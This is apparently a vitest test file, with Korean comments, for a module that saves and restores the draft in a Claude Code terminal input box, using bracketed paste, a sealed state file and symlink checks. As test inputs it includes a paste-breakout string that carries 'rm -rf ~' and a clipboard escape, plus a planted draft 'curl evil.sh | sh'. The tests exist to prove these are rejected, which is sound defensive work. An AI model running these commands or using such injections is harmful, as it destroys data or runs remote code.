import { mkdtemp, readFile, readdir, rm, stat, writeFile, mkdir, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  DraftKeeper,
  type DraftSeal,
  DraftScreen,
  cleanDraftText,
  MAX_RESTORE_CHARS,
  pasteBytes,
  readClaudeInput,
  readDraftFile,
  restoreRefusal,
  sanitizePasteText,
  writeDraftFile,
} from './session-terminal-draft';

/**
 * 입력창 읽기·복원 시험. 화면 모양은 실제 Claude Code를 터미널로 돌려 기록한 화면(2026-11-18, term-pass-*-screen.txt의 아래쪽)에서 가져왔다:
 * 가로줄 → `❯ 글` → 가로줄 → 상태 줄. 이 Mac에서는 실제 CLI를 띄울 수 없어(devfs 멈춤) 새로 기록하지 않았다
 */
const RULE = '─'.repeat(156);
const REAL_STATUS = ['  [Fable 5.2 | Max] │ vf3-046c7e8c git:(b-studio/vf3-046c7e8c*)', '  Context █░░░░░░░░░ 7% │ Usage █░░░░░░░░░ 7% (resets in 4h 39m)', '  ⏵⏵ auto mode on (shift+tab to cycle)'];
const REAL_ANSWER = ['  ⎿  Stop says: [b-studio] 검증 통과 — 체크포인트 39087c4', '', '✻ Crunched for 41s · done 6:11 PM', ''];
const sealFor = (file: string): DraftSeal => ({ key: Buffer.alloc(32, 7), context: file });
const DRAFT = 'README.md의 첫 줄만 읽어서 알려 줘. 아무것도 고치지 마.';

const realScreen = (box: string[]): string[] => [...REAL_ANSWER, RULE, ...box, RULE, ...REAL_STATUS];

/** 화면 줄을 터미널 바이트로: 지우고 맨 위부터 그린다. 붙여 넣기를 받는다고 알린다(?2004h) */
function bytes(lines: string[], options: { paste?: boolean } = {}): string {
  return `${options.paste === false ? '' : '\x1b[?2004h'}\x1b[2J\x1b[H${lines.join('\r\n')}`;
}

let dir = '';
beforeEach(async () => {
  dir = await mkdtemp(path.join(tmpdir(), 'b-studio-draft-'));
});
afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('입력창 읽기(readClaudeInput)', () => {
  it('기록한 실제 화면에서 입력창의 글을 읽는다', () => {
    expect(readClaudeInput(realScreen([`❯ ${DRAFT}`]))).toEqual({ kind: 'text', text: DRAFT });
  });

  it('비어 있으면 비었다고 읽는다(`❯`만 있는 줄)', () => {
    expect(readClaudeInput(realScreen(['❯']))).toEqual({ kind: 'empty' });
    expect(readClaudeInput(realScreen(['❯ ']))).toEqual({ kind: 'empty' });
  });

  it('가로줄이 없으면 모른다', () => {
    expect(readClaudeInput([`❯ ${DRAFT}`, ...REAL_STATUS])).toMatchObject({ kind: 'unknown' });
    expect(readClaudeInput(['$ ls', 'a.txt'])).toMatchObject({ kind: 'unknown' });
  });

  it('위 가로줄 바로 아래가 `❯`가 아니면 모른다', () => {
    expect(readClaudeInput(realScreen([`> ${DRAFT}`]))).toMatchObject({ kind: 'unknown' });
    expect(readClaudeInput(realScreen(['  글만 있다']))).toMatchObject({ kind: 'unknown' });
  });

  it('번호 선택지(`❯ 1. Yes`)는 입력창이 아니라 묻는 창이라 모른다', () => {
    expect(readClaudeInput(realScreen(['❯ 1. Yes']))).toMatchObject({ kind: 'unknown', reason: '선택지를 고르는 창이다' });
  });

  it('입력창 아래에 상태 줄이 아닌 것이 많이 있으면 모른다', () => {
    const lines = [RULE, `❯ ${DRAFT}`, RULE, ...Array.from({ length: 12 }, (_, index) => `줄 ${index}`)];
    expect(readClaudeInput(lines)).toMatchObject({ kind: 'unknown' });
  });

  it('큰 화면에서 입력창 아래가 비어 있어도 읽는다', () => {
    expect(readClaudeInput([...realScreen([`❯ ${DRAFT}`]), ...Array.from({ length: 30 }, () => '')])).toEqual({ kind: 'text', text: DRAFT });
  });

  it('두 줄 이상이면 줄을 이어 읽는다(이어지는 줄은 두 칸 들여쓴다)', () => {
    expect(readClaudeInput(realScreen(['❯ 첫 줄', '  둘째 줄']))).toEqual({ kind: 'text', text: '첫 줄\n둘째 줄' });
    // 들여쓰지 않은 줄이 끼면 입력창의 줄이 아니다
    expect(readClaudeInput(realScreen(['❯ 첫 줄', '들여쓰지 않은 줄']))).toMatchObject({ kind: 'unknown' });
  });

  it('글이 상한을 넘으면 모른다', () => {
    expect(readClaudeInput(realScreen([`❯ ${'가'.repeat(20_001)}`]))).toMatchObject({ kind: 'unknown', reason: '글이 너무 길다' });
  });

  it('마지막 쌍을 읽는다: 앞의 대화에 같은 모양이 있어도 아래의 입력창이 이긴다', () => {
    const old = [RULE, '❯ 옛 글', RULE, '  상태'];
    expect(readClaudeInput([...old, ...realScreen([`❯ ${DRAFT}`])])).toEqual({ kind: 'text', text: DRAFT });
  });
});

describe('붙여 넣기 바이트(pasteBytes)', () => {
  it('괄호 붙여 넣기 한 덩어리뿐이고 Enter(\\r)도 줄바꿈도 없다', () => {
    const out = pasteBytes(DRAFT)!;
    expect(out).toBe(`\x1b[200~${DRAFT}\x1b[201~`);
    expect(out).not.toContain('\r');
    expect(out).not.toContain('\n');
  });

  it('글 안에 끼워 넣은 ESC[201~ 와 제어 문자는 걸러 붙여 넣기 밖으로 새지 않는다', () => {
    const attack = 'ok\x1b[201~\rrm -rf ~\r\n\x03\x1b[200~x\x1b]52;c;AAAA\x07\u0085\u2028';
    const out = pasteBytes(attack)!;
    // 끝 표시는 맨 끝에 한 번뿐이고, 그 밖에 ESC가 없다
    expect(out.startsWith('\x1b[200~')).toBe(true);
    expect(out.endsWith('\x1b[201~')).toBe(true);
    expect(out.slice(6, -6)).not.toMatch(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/u);
    expect(out.split('\x1b').length).toBe(3);
    expect(out).not.toContain('\r');
    expect(out).not.toContain('\n');
    expect(sanitizePasteText(attack)).not.toContain('\x1b');
  });

  it('걸러 낸 뒤 남은 글이 없으면 보낼 것이 없다', () => {
    expect(pasteBytes('\x1b\r\n\t ')).toBeUndefined();
    expect(pasteBytes('')).toBeUndefined();
  });
});

describe('되살려도 되는 글(restoreRefusal)', () => {
  it('한 줄이고 상한 안이고 제어 문자가 없으면 되살린다', () => {
    expect(restoreRefusal(DRAFT)).toBeUndefined();
  });
  it('여러 줄, 상한 초과, 제어 문자는 입력창에 넣지 않는다', () => {
    expect(restoreRefusal('a\nb')).toContain('여러 줄');
    expect(restoreRefusal('가'.repeat(MAX_RESTORE_CHARS + 1))).toContain('넘어');
    expect(restoreRefusal('a\x1b[201~b')).toContain('제어 문자');
  });
});

describe('저장 파일', () => {
  it('600 권한으로 쓰고 읽는다. 비면 지운다', async () => {
    const file = path.join(dir, 'b', 'terminal-draft.json');
    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
    expect((await stat(file)).mode & 0o777).toBe(0o600);
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    await writeDraftFile(file, { version: 1 }, sealFor(file));
    await expect(stat(file)).rejects.toThrow();
  });

  it('크거나 모양이 틀린 파일은 없는 것으로 본다(읽기 전에 크기를 본다)', async () => {
    const file = path.join(dir, 'terminal-draft.json');
    // 내용은 올바른데 크기만 크다: 크기를 읽기 전에 보지 않으면 읽어 버린다
    await writeFile(file, JSON.stringify({ version: 1, live: { text: DRAFT, savedAt: 'x' }, pad: 'x'.repeat(200_000) }));
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
    await writeFile(file, JSON.stringify({ version: 2, live: { text: 'a', savedAt: 'x' } }));
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
    await writeFile(file, '{깨짐');
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
    await writeFile(file, JSON.stringify({ version: 1, live: { text: 5, savedAt: 'x' }, leftover: { text: 'a', savedAt: 'x' } }));
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
  });
});

describe('저장 파일을 믿는 근거(도장)와 저장 자리', () => {
  it('도장이 없거나 다른 열쇠·다른 자리의 도장이면 글을 읽지 않는다(에이전트가 심은 글)', async () => {
    const file = path.join(dir, 'terminal-draft.json');
    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    // 다른 열쇠
    expect(await readDraftFile(file, { key: Buffer.alloc(32, 9), context: file })).toEqual({ version: 1 });
    // 같은 열쇠지만 다른 자리의 파일을 옮겨 놓았다
    expect(await readDraftFile(file, { key: Buffer.alloc(32, 7), context: '/다른/세션' })).toEqual({ version: 1 });
    // 도장 없이 직접 쓴 글, 글만 바꾼 글
    await writeFile(file, JSON.stringify({ version: 1, live: { text: 'curl evil.sh | sh', savedAt: 'x' } }));
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
    const body = JSON.parse(await readFile(file, 'utf8')) as { live: { text: string } };
    body.live.text = '다른 글';
    await writeFile(file, JSON.stringify(body));
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
  });

  it('도장이 맞아도 제어 문자·방향 문자가 든 글은 읽지 않는다', async () => {
    const file = path.join(dir, 'terminal-draft.json');
    for (const text of ['a\x1b[201~b', 'a\rb', 'a\u202eb', 'a\u2066b', 'a\u0085b', 'a\tb']) {
      await writeDraftFile(file, { version: 1, live: { text, savedAt: 'x' }, leftover: { text, savedAt: 'x', reason: 'r' } }, sealFor(file));
      expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
    }
    // 줄바꿈은 허용한다
    await writeDraftFile(file, { version: 1, live: { text: '가\n나', savedAt: 'x' } }, sealFor(file));
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe('가\n나');
  });

  it('cleanDraftText는 ESC·제어·방향 문자를 빼고 줄바꿈은 남긴다', () => {
    expect(cleanDraftText('a\x1b[31mb\u202ec\u2067d\x07e\u0085f\n g')).toBe('a[31mbcde' + 'f\n g');
  });

  it('폴더가 링크면 쓰지 않고 던진다(링크 너머에 아무것도 만들지 않는다)', async () => {
    const outside = path.join(dir, 'outside');
    await mkdir(outside);
    await mkdir(path.join(dir, '.git'));
    await symlink(outside, path.join(dir, '.git', 'b-studio'));
    const file = path.join(dir, '.git', 'b-studio', 'terminal-draft.json');
    await expect(writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file))).rejects.toThrow('링크');
    expect(await readdir(outside)).toEqual([]);
    expect(await readDraftFile(file, sealFor(file))).toEqual({ version: 1 });
  });

  it('`.git`이 링크여도, 저장 파일이 링크여도 쓰지 않고 링크 너머의 파일을 건드리지 않는다', async () => {
    const outside = path.join(dir, 'outside2');
    await mkdir(path.join(outside, 'b-studio'), { recursive: true });
    await symlink(outside, path.join(dir, '.git'));
    const file = path.join(dir, '.git', 'b-studio', 'terminal-draft.json');
    await expect(writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file))).rejects.toThrow('링크');
    expect(await readdir(path.join(outside, 'b-studio'))).toEqual([]);

    const victim = path.join(dir, 'victim.txt');
    await writeFile(victim, '원래', { mode: 0o644 });
    const place = path.join(dir, 'place');
    await mkdir(place);
    const link = path.join(place, 'terminal-draft.json');
    await symlink(victim, link);
    await expect(writeDraftFile(link, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(link))).rejects.toThrow('일반 파일');
    expect(await readFile(victim, 'utf8')).toBe('원래');
    expect((await stat(victim)).mode & 0o777).toBe(0o644);
    expect(await readDraftFile(link, sealFor(link))).toEqual({ version: 1 });
  });

  it('임시 파일은 남지 않고 저장 파일만 남는다', async () => {
    const file = path.join(dir, 'b', 'terminal-draft.json');
    await writeDraftFile(file, { version: 1, live: { text: DRAFT, savedAt: 'x' } }, sealFor(file));
    expect(await readdir(path.dirname(file))).toEqual(['terminal-draft.json']);
  });
});

describe('헤드리스 화면(DraftScreen)', () => {
  it('터미널 바이트를 해석해 입력창 글을 읽는다. 흐린 자리 표시 문구는 글이 아니다', async () => {
    const screen = new DraftScreen({ cols: 100, rows: 12 });
    screen.write(bytes(realScreen([`❯ ${DRAFT}`])));
    expect(readClaudeInput(await screen.lines())).toEqual({ kind: 'text', text: DRAFT });
    expect(screen.bracketedPaste()).toBe(true);
    screen.write(bytes(realScreen(['❯ \x1b[2mTry "fix lint errors"\x1b[22m'])));
    expect(readClaudeInput(await screen.lines())).toEqual({ kind: 'empty' });
    screen.dispose();
  });

  it('커서(반전 칸)와 색은 글에 섞이지 않는다', async () => {
    const screen = new DraftScreen({ cols: 100, rows: 12 });
    screen.write(bytes(realScreen([`❯ \x1b[1m${DRAFT}\x1b[7m \x1b[0m`])));
    expect(readClaudeInput(await screen.lines())).toEqual({ kind: 'text', text: DRAFT });
    screen.dispose();
  });
});

/** 되살리기 시험의 보조: 터미널에 쓴 것을 모으고, 쓰면 CLI가 입력창에 그린 것처럼 화면을 바꿔 주는 가짜 CLI */
function harness(options: { resumed?: boolean; echo?: boolean; first?: string[] } = {}) {
  const file = path.join(dir, 'terminal-draft.json');
  const written: string[] = [];
  const leftovers: Array<string | undefined> = [];
  const keeper: DraftKeeper = new DraftKeeper({
    file,
    seal: sealFor(file),
    size: { cols: 100, rows: 12 },
    resumed: options.resumed ?? true,
    write: (data) => {
      written.push(data);
      const pasted = /^\x1b\[200~(.*)\x1b\[201~$/su.exec(data)?.[1];
      if (options.echo !== false && pasted !== undefined) keeper.feed(Buffer.from(bytes(realScreen([`❯ ${pasted}`]))));
    },
    onLeftover: (text) => leftovers.push(text),
    saveEveryMs: 60_000,
    signalTimeoutMs: 60_000,
    boxWaitMs: 300,
    pollMs: 20,
  });
  return { keeper, file, written, leftovers };
}

describe('저장(DraftKeeper.saveNow)', () => {
  it('입력창의 글을 600 권한으로 저장하고, 비면 지운다', async () => {
    const { keeper, file } = harness();
    await keeper.start();
    keeper.feed(Buffer.from(bytes(realScreen([`❯ ${DRAFT}`]))));
    await keeper.saveNow();
    expect((await stat(file)).mode & 0o777).toBe(0o600);
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
    await keeper.saveNow();
    await expect(stat(file)).rejects.toThrow();
    await keeper.stop();
  });

  it('모르는 화면(전체 화면 UI 등)이면 저장해 둔 글을 지우지도 바꾸지도 않는다', async () => {
    const { keeper, file } = harness({ resumed: false });
    await keeper.start();
    keeper.feed(Buffer.from(bytes(realScreen([`❯ ${DRAFT}`]))));
    await keeper.saveNow();
    keeper.feed(Buffer.from(bytes(['  /resume 목록', '❯ 1. 세션 하나'])));
    await keeper.saveNow();
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    await keeper.stop();
  });

  it('닫을 때 마지막으로 저장한다', async () => {
    const { keeper, file } = harness();
    await keeper.start();
    keeper.feed(Buffer.from(bytes(realScreen([`❯ ${DRAFT}`]))));
    await keeper.stop();
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
  });
});

describe('되살리기(DraftKeeper.onCliUp)', () => {
  async function withSaved(options: Parameters<typeof harness>[0] = {}, text = DRAFT) {
    const h = harness(options);
    await mkdir(path.dirname(h.file), { recursive: true });
    await writeDraftFile(h.file, { version: 1, live: { text, savedAt: 'old' } }, sealFor(h.file));
    await h.keeper.start();
    return h;
  }

  it('빈 입력창이고 붙여 넣기를 받으면 괄호 붙여 넣기로만 넣고 Enter는 보내지 않는다', async () => {
    const { keeper, written, file } = await withSaved();
    keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
    expect(await keeper.onCliUp()).toBe('restored');
    expect(written).toEqual([`\x1b[200~${DRAFT}\x1b[201~`]);
    expect(written.join('')).not.toMatch(/[\r\n]/);
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    // 두 번째 신호는 아무것도 하지 않는다
    expect(await keeper.onCliUp()).toBe('none');
    expect(written).toHaveLength(1);
    await keeper.stop();
  });

  it('신호가 오기 전의 빈 화면이 저장해 둔 글을 지우지 않는다', async () => {
    const { keeper, file, written } = await withSaved();
    keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
    await keeper.saveNow();
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
    expect(written).toEqual([]);
    await keeper.stop();
    // 닫을 때도 지우지 않는다: 다음에 열 때 다시 시도한다
    expect((await readDraftFile(file, sealFor(file))).live?.text).toBe(DRAFT);
  });

  it('입력창에 이미 글이 있으면 넣지 않고 쓰다 만 글로 남긴다', async () => {
    const { keeper, written, leftovers, file } = await withSaved();
    keeper.feed(Buffer.from(bytes(realScreen(['❯ 다른 글']))));
    expect(await keeper.onCliUp()).toBe('left');
    expect(written).toEqual([]);
    expect(leftovers.at(-1)).toBe(DRAFT);
    const saved = await readDraftFile(file, sealFor(file));
    expect(saved.leftover?.text).toBe(DRAFT);
    expect(saved.leftover?.reason).toContain('이미 글이 있어');
    expect(saved.live).toBeUndefined();
    await keeper.stop();
  });

  it('모르는 화면 모양이면 넣지 않는다', async () => {
    const { keeper, written, leftovers } = await withSaved();
    keeper.feed(Buffer.from(bytes(['$ claude', 'Do you trust this folder?', '❯ 1. Yes'])));
    expect(await keeper.onCliUp()).toBe('left');
    expect(written).toEqual([]);
    expect(leftovers.at(-1)).toBe(DRAFT);
    await keeper.stop();
  });

  it('붙여 넣기를 받는 상태가 아니면 넣지 않는다', async () => {
    const { keeper, written, leftovers } = await withSaved();
    keeper.feed(Buffer.from(bytes(realScreen(['❯']), { paste: false })));
    expect(await keeper.onCliUp()).toBe('left');
    expect(written).toEqual([]);
    expect(leftovers.at(-1)).toBe(DRAFT);
    await keeper.stop();
  });

  it('상한을 넘는 글, 여러 줄은 넣지 않고 보여 준다', async () => {
    for (const text of ['가'.repeat(MAX_RESTORE_CHARS + 1), '첫 줄\n둘째 줄']) {
      const { keeper, written, leftovers } = await withSaved({}, text);
      keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
      expect(await keeper.onCliUp()).toBe('left');
      expect(written).toEqual([]);
      expect(leftovers.at(-1)).toBe(text);
      await keeper.stop();
      await rm(path.join(dir, 'terminal-draft.json'), { force: true });
    }
  });

  it('붙여 넣은 글이 입력창에 보이지 않으면 되살렸다고 하지 않는다(저장한 뒤 화면이 바뀜)', async () => {
    const { keeper, leftovers } = await withSaved({ echo: false });
    keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
    expect(await keeper.onCliUp()).toBe('left');
    expect(leftovers.at(-1)).toBe(DRAFT);
    await keeper.stop();
  });

  it('이어 붙인 대화가 없으면(새 대화) 저장한 글을 입력창에 넣지 않고 보여 준다', async () => {
    const { keeper, written, leftovers } = await withSaved({ resumed: false });
    keeper.feed(Buffer.from(bytes(realScreen(['❯']))));
    expect(await keeper.onCliUp()).toBe('none');
    expect(written).toEqual([]);
    expect(leftovers.at(-1)).toBe(DRAFT);
    await keeper.stop();
  });

  it('쓰다 만 글은 새 글을 쓰기 시작하면 사라지고, 요청을 보내면 치운다', async () => {
    const { keeper, leftovers, file } = await withSaved({ resumed: false });
    expect(leftovers.at(-1)).toBe(DRAFT);
    keeper.feed(Buffer.from(bytes(realScreen(['❯ 새 글']))));
    await keeper.saveNow();
    expect(leftovers.at(-1)).toBeUndefined();
    const saved = await readDraftFile(file, sealFor(file));
    expect(saved.leftover).toBeUndefined();
    expect(saved.live?.text).toBe('새 글');

    await writeDraftFile(file, { version: 1, leftover: { text: '남은 글', savedAt: 'x', reason: 'r' } }, sealFor(file));
    const again = harness({ resumed: false });
    await again.keeper.start();
    expect(again.leftovers.at(-1)).toBe('남은 글');
    await again.keeper.clearLeftover();
    expect(again.leftovers.at(-1)).toBeUndefined();
    await expect(stat(file)).rejects.toThrow();
    await keeper.stop();
    await again.keeper.stop();
  });

  it('신호가 끝내 오지 않으면 입력창에 넣지 않고 쓰다 만 글로 남긴다', async () => {
    const h = harness();
    await writeDraftFile(h.file, { version: 1, live: { text: DRAFT, savedAt: 'old' } }, sealFor(h.file));
    const slow = new DraftKeeper({ file: h.file, seal: sealFor(h.file), size: { cols: 100, rows: 12 }, resumed: true, write: () => {}, onLeftover: (text) => h.leftovers.push(text), signalTimeoutMs: 30, saveEveryMs: 60_000 });
    await slow.start();
    await new Promise((resolve) => setTimeout(resolve, 150));
    expect(h.leftovers.at(-1)).toBe(DRAFT);
    expect((await readDraftFile(h.file, sealFor(h.file))).leftover?.reason).toContain('신호');
    await slow.stop();
  });
});
